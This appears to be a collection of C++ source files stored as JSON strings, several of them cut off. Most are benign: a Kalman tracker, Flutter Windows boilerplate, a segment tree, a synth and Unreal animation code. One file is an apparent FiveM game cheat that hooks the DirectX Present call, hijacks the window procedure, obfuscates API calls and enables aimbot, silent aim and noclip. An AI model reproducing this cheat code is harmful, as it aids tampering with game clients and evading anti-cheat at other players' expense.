measurement[3];\n    std(1) = 2 * _std_weight_position * measurement[3];\n    std(2) = 1e-2;\n    std(3) = 2 * _std_weight_position * measurement[3];\n    std(4) = 10 * _std_weight_velocity * measurement[3];\n    std(5) = 10 * _std_weight_velocity * measurement[3];\n    std(6) = 1e-5;\n    std(7) = 10 * _std_weight_velocity * measurement[3];\n\n    KAL_MEAN tmp = std.array().square();\n    KAL_COVA var = tmp.asDiagonal();\n    return std::make_pair(mean, var);\n}\n\nvoid KalmanFilter::predict(KAL_MEAN& mean, KAL_COVA& covariance) {\n    // revise the data;\n    DETECT_BOX std_pos;\n    std_pos << _std_weight_position * mean(3), _std_weight_position * mean(3), 1e-2, _std_weight_position * mean(3);\n    DETECT_BOX std_vel;\n    std_vel << _std_weight_velocity * mean(3), _std_weight_velocity * mean(3), 1e-5, _std_weight_velocity * mean(3);\n    KAL_MEAN tmp;\n    tmp.block<1, 4>(0, 0) = std_pos;\n    tmp.block<1, 4>(0, 4) = std_vel;\n    tmp = tmp.array().square();\n    KAL_COVA motion_cov = tmp.asDiagonal();\n    KAL_MEAN mean1 = this->_motion_mat * mean.transpose();\n    KAL_COVA covariance1 = this->_motion_mat * covariance * (_motion_mat.transpose());\n    covariance1 += motion_cov;\n\n    mean = mean1;\n    covariance = covariance1;\n}\n\nKAL_HDATA KalmanFilter::project(const KAL_MEAN& mean, const KAL_COVA& covariance, float score)  //\n{\n    DETECT_BOX std;\n    std << _std_weight_position * mean(3), _std_weight_position * mean(3), 1e-1, _std_weight_position * mean(3);\n    // NSA kalman filter\n    // for (int pos = 0; pos < 4; ++pos)\n    // {\n    // \tstd(0,pos) = (1 - score) * std(0,pos);\n    // }\n    std = (1 - score) * std;\n\n    KAL_HMEAN mean1 = _update_mat * mean.transpose();\n    KAL_HCOVA covariance1 = _update_mat * covariance * (_update_mat.transpose());\n    Eigen::Matrix<float, 4, 4> diag = std.asDiagonal();\n    diag = diag.array().square().matrix();\n    covariance1 += diag;\n    //    covariance1.diagonal() << diag;\n    return std::make_pair(mean1, covariance1);\n}\n\nKAL_DATA\nKalmanFilter::update(const KAL_MEAN& mean, const KAL_COVA& covariance, const DETECT_BOX& measurement,\n                     float score)  // NSA kalman filter\n{\n    KAL_HDATA pa = project(mean, covariance, score);  // NSA kalman filter\n    KAL_HMEAN projected_mean = pa.first;\n    KAL_HCOVA projected_cov = pa.second;\n\n    // chol_factor, lower =\n    // scipy.linalg.cho_factor(projected_cov, lower=True, check_finite=False)\n    // kalmain_gain =\n    // scipy.linalg.cho_solve((cho_factor, lower),\n    // np.dot(covariance, self._upadte_mat.T).T,\n    // check_finite=False).T\n    Eigen::Matrix<float, 4, 8> B = (covariance * (_update_mat.transpose())).transpose();\n    Eigen::Matrix<float, 8, 4> kalman_gain = (projected_cov.llt().solve(B)).transpose();  // eg.8x4\n    Eigen::Matrix<float, 1, 4> innovation = measurement - projected_mean;                 // eg.1x4\n    auto tmp = innovation * (kalman_gain.transpose());\n    KAL_MEAN new_mean = (mean.array() + tmp.array()).matrix();\n    KAL_COVA new_covariance = covariance - kalman_gain * projected_cov * (kalman_gain.transpose());\n    return std::make_pair(new_mean, new_covariance);\n}\n\nEigen::Matrix<float, 1, -1> KalmanFilter::gating_distance(const KAL_MEAN& mean, const KAL_COVA& covariance,\n                                                          const std::vector<DETECT_BOX>& measurements, bool only_position) {\n    KAL_HDATA pa = this->project(mean, covariance);\n    if (only_position) {\n        printf(\"not implement",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rest_api_example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = !Settings::Player::NoClip;\r\n\t}\r\n\tImGui::GetIO().MouseDrawCursor = Menu::Open;\r\n\tImGui::GetIO().WantCaptureKeyboard = Menu::Open;\r\n\tif (AuthConnected)\r\n\t{\r\n\t\t\r\n\r\n\t\tVisuals::Hook();\r\n\t\tPlayers::Hook();\r\n\t\tif (!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <bits/stdc++.h>\n#include \"utils.h\"\n\nusing namespace std;\n\nclass SegmentTree\n{\npublic:\n    vector<int> m_tree;\n    int m_n;\n\n    SegmentTree(vector<int> x)\n    {\n        int n = x.size();\n        m_n = n;\n        m_tree.resize(2 * n);\n\n        for (int i = 0; i < n; i++)\n        {\n            m_tree[n + i] = x[i];\n        }\n\n        for (int i = n - 1; i > 0; i--)\n        {\n            m_tree[i] = m_tree[i * 2] + m_tree[i * 2 + 1];\n            ;\n        }\n\n        m_tree[0] = -1;\n    }\n\n    int sum(int a, int b)\n    {\n        int n = m_tree.size() / 2;\n        a += n;\n        b += n;\n        int s = 0;\n        while (a <= b)\n        {\n            if (a % 2 == 1)\n                s += m_tree[a++];\n            if (b % 2 == 0)\n                s += m_tree[b--];\n            a /= 2;\n            b /= 2;\n        }\n        return s;\n    }\n\n    void add(int i, int x)\n    {\n        int a = i + m_n;\n        while (a > 0)\n        {\n            m_tree[a] += x;\n            a /= 2;\n        }\n    }\n\n    void print()\n    {\n        for (int i = 0; i < m_tree.size(); i++)\n        {\n            cout << m_tree[i] << ' ';\n        }\n        cout << '\\n';\n    }\n};\n\nint main()\n{\n\n    SegmentTree s = SegmentTree(vector<int>{5, 8, 6, 3, 2, 7, 2, 6});\n\n    cout << s.sum(0, 5) << '\\n';\n\n    s.print();\n\n    s.add(2, 2);\n\n    s.print();\n\n    cout << add(1, 2) << '\\n';\n}\n\n/*\ntrace for sum(0,1)\n\n\n*/",
    "#include <daisy_seed.h>\n\n#include <algorithm>\n#include <span>\n\n#include \"phasedist.h\"\n#include \"vult_daisy.hpp\"\n\nvult2daisy(Phasedist);\n\nusing namespace daisy;\n\nDaisySeed hw;\nMidiUsbHandler midi;\nPhasedist voice;\n\n/** Function that gets called at a regular interval by the hardware to\n *  process, and/or generate audio signals\n */\nvoid AudioCallback(AudioHandle::InputBuffer in, AudioHandle::OutputBuffer out,\n                   size_t size) {\n  voice.ProcessBlock({&in[0][0], size}, {&out[0][0], size});\n}\n\nvoid HandleMidi() {\n  /** Listen to MIDI for new changes */\n  midi.Listen();\n\n  /** When there are messages waiting in the queue... */\n  while (midi.HasEvents()) {\n    /** Pull the oldest one from the list... */\n    auto msg = midi.PopEvent();\n    switch (msg.type) {\n      case NoteOn:\n        voice.NoteOn(msg.AsNoteOn());\n        break;\n\n      case NoteOff:\n        voice.NoteOff(msg.AsNoteOff());\n        break;\n\n      case ControlChange:\n        voice.ControlChange(msg.AsControlChange());\n        break;\n\n      default:\n        break;\n    }\n  }\n}\n\nint main(void) {\n  /** Basic initialization of Daisy hardware */\n  hw.Configure();\n  hw.Init();\n\n  /** Initialize USB Midi\n   *  by default this is set to use the built in (USB FS) peripheral.\n   *\n   *  by setting midi_cfg.transport_config.periph =\n   * MidiUsbTransport::Config::EXTERNAL the USB HS pins can be used (as FS)\n   * for MIDI\n   */\n  MidiUsbHandler::Config midi_cfg;\n  midi_cfg.transport_config.periph = MidiUsbTransport::Config::INTERNAL;\n  midi.Init(midi_cfg);\n\n  /** Initialize our test tone */\n  voice.Init();\n\n  /** And start the audio callback */\n  hw.StartAudio(AudioCallback);\n\n  while (1) {\n    HandleMidi();\n  }\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright 2024 jeonghun\n\n\n#include \"LLAnimInstance.h\"\n#include \"Components/CapsuleComponent.h\"\n#include \"GameFramework/Character.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Animation/AnimNodeReference.h\"\n#include \"AnimCharacterMovementLibrary.h\"\n#include \"AnimDistanceMatchingLibrary.h\"\n#include \"SequenceEvaluatorLibrary.h\"\n#include \"SequencePlayerLibrary.h\"\n#include \"AnimationStateMachineLibrary.h\"\n#include \"AnimExecutionContextLibrary.h\"\n#include \"KismetAnimationLibrary.h\"\n\nvoid ULLAnimInstance::NativeUpdateAnimation(float DeltaSeconds)\n{\n\tSuper::NativeUpdateAnimation(DeltaSeconds);\n\n\tif (const TObjectPtr<ACharacter> Owner = Cast<ACharacter>(GetOwningActor()))\n\t{\n\t\tCurrAcceleration = Owner->GetCharacterMovement()->GetCurrentAcceleration();\n\t\tPrevWorldLocation = WorldLocation;\n\t\tWorldLocation = Owner->GetActorLocation();\n\t\tPrevWorldRotation = WorldRotation;\n\t\tWorldRotation = Owner->GetActorRotation();\n\t\tWorldVelocity = Owner->GetVelocity();\n\t\tLastUpdateVelocity = Owner->GetCharacterMovement()->GetLastUpdateVelocity();\n\t\tbUseSeparateBrakingFriction = Owner->GetCharacterMovement()->bUseSeparateBrakingFriction;\n\t\tBrakingFrictionFactor = Owner->GetCharacterMovement()->BrakingFrictionFactor;\n\t\tGroundFriction = Owner->GetCharacterMovement()->GroundFriction;\n\t\tBrakingFriction = Owner->GetCharacterMovement()->BrakingFriction;\n\t\tBrakingDecelerationWalking = Owner->GetCharacterMovement()->BrakingDecelerationWalking;\n\t\tbIsOnGround = Owner->GetCharacterMovement()->IsMovingOnGround();\n\t\tbIsJumping = Owner->GetCharacterMovement()->MovementMode == MOVE_Falling && WorldVelocity.Z > 0;\n\t\tbIsFalling = Owner->GetCharacterMovement()->MovementMode == MOVE_Falling && WorldVelocity.Z <= 0;\n\t\tTimeToJumpApex = bIsJumping ? -WorldVelocity.Z / Owner->GetCharacterMovement()->GetGravityZ() : 0;\n\t\tTimeFalling = bIsFalling ? TimeFalling + DeltaSeconds : bIsJumping ? 0 : TimeFalling;\n\t\tbIsAnyMontagePlaying = IsAnyMontagePlaying();\n\t\tGroundDistance = GetGroundDistance(Owner);\n\t}\n}\n\nvoid ULLAnimInstance::NativeThreadSafeUpdateAnimation(float DeltaSeconds)\n{\n\tSuper::NativeThreadSafeUpdateAnimation(DeltaSeconds);\n\n\tUpdateLocationData(DeltaSeconds);\n\tUpdateRotationData();\n\tUpdateVelocityData();\n\tUpdateAccelerationData();\n\tUpdateRootYawOffset(DeltaSeconds);\n\n\tbIsFirstUpdate = false;\n}\n\nbool ULLAnimInstance::ShouldDistanceMatchStop() const\n{\n\treturn bHasVelocity && !bHasAcceleration;\n}\n\ndouble ULLAnimInstance::GetPredictedStopDistance() const\n{\n\treturn UAnimCharacterMovementLibrary::PredictGroundMovementStopLocation(\n\t\tLastUpdateVelocity,\n\t\tbUseSeparateBrakingFriction,\n\t\tBrakingFriction,\n\t\tGroundFriction,\n\t\tBrakingFrictionFactor,\n\t\tBrakingDecelerationWalking).Size2D();\n}\n\nvoid ULLAnimInstance::UpdateIdleTurnYawState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tFAnimationStateResultReference AnimationState;\n\tEAnimNodeReferenceConversionResult ConversionResult;\n\tUAnimationStateMachineLibrary::ConvertToAnimationStateResult(Node, AnimationState, ConversionResult);\n\tif (ConversionResult == EAnimNodeReferenceConversionResult::Succeeded)\n\t{\n\t\tif (UAnimationStateMachineLibrary::IsStateBlendingOut(Context, AnimationState))\n\t\t{\n\t\t\tTurnYawCurveValue = 0;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tRootYawOffsetMode = ERootYawOffsetMode::Accumulate;\n\t\t\tProcessTurnYawCurve();\n\t\t}\n\t}\n}\n\nvoid ULLAnimInstance::LandRecoveryStart(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tLandRecoveryAlpha = FMath::GetMappedRangeValueClamped(FVector2f(0, 0.4), FVector2f(0.1, 1.0), TimeFalling); \n}\n\nvoid ULLAnimInstance::SetupIdleState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tIdleBreakDelayTime = FMath::TruncToInt(FMath::Abs(WorldLocation.X + WorldLocation.Y)) % 10 + 6;\n\tTimeUntilNextIdleBreak = IdleBreakDelayTime;\n}\n\nvoid ULLAnimInstance::UpdateIdleState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tFAnimationStateResultReference AnimationState;\n\tEAnimNodeReferenceConversionResult ConversionResult;\n\tUAnimationStateMachineLibrary::ConvertToAnimationStateResult(Node, AnimationState, ConversionResult);\n\tif (ConversionResult == EAnimNodeReferenceConversionResult::Succeeded)\n\t{\n\t\tif (!UAnimationStateMachineLibrary::IsStateBlendingOut(Context, AnimationState))\n\t\t{\n\t\t\tif (CanPlayIdleBreak())\n\t\t\t{\n\t\t\t\tTimeUntilNextIdleBreak -= UAnimExecutionContextLibrary::GetDeltaTime(Context);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tTimeUntilNextIdleBreak = IdleBreakDelayTime;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid ULLAnimInstance::SetUpTurnInPlaceRotationState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tTurnInPlaceRotationDirection = FMath::Sign(RootYawOffset) * -1.f;\n}\n\nvoid ULLAnimInstance::SetUpTurnInPlaceRecoveryState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tTurnInPlaceRecoveryDirection = TurnInPlaceRotationDirection;\n}\n\nvoid ULLAnimInstance::SetUpStartState(const FAnimUpdateContext& Context, const FAnimNodeReference& Node)\n{\n\tStartDirection = LocalVelocityDirection;\n}\n\nvoid U",
    "/*\n    This Source Code Form is subject to the terms of the Mozilla Public\n    License, v. 2.0. If a copy of the MPL was not distributed with this\n    file, You can obtain one at https://mozilla.org/MPL/2.0/.\n*/\n\n#include <iostream>\n#include <proxima/proxima.hpp>\n\nint main()\n{\n    proxima::Grid<uint8_t> grid (10, 10);\n    grid.fill(1);\n\n    grid(0, 0) = 255;\n    grid(9, 6) = 255;\n    grid(8, 6) = 255;\n    grid(7, 6) = 255;\n    grid(6, 6) = 255;\n    grid(5, 6) = 255;\n\n    proxima::Grid<uint16_t> int1 (10, 10);\n    proxima::GenerateIntegrationField(&grid, grid.getIndex(6, 9), &int1);\n\n    proxima::Grid<uint16_t> int2 (10, 10);\n    proxima::GenerateIntegrationField(&grid, grid.getIndex(4, 5), &int2);\n\n    proxima::CombineIntegrationFields(&int1, &int2, &int1);\n\n    proxima::Grid<float> directionField (10, 10);\n    proxima::GenerateVectorField(&int1, &directionField);\n\n    for (uint32_t i = 0; i < grid.height(); i++)\n    {\n        for (uint32_t j = 0; j < grid.width(); j++)\n        {\n            std::cout << directionField(j, i);\n            if (j != grid.width() - 1) std::cout << \",\";\n        }\n        std::cout << \"\\n\";\n    }\n\n    return 0;\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct 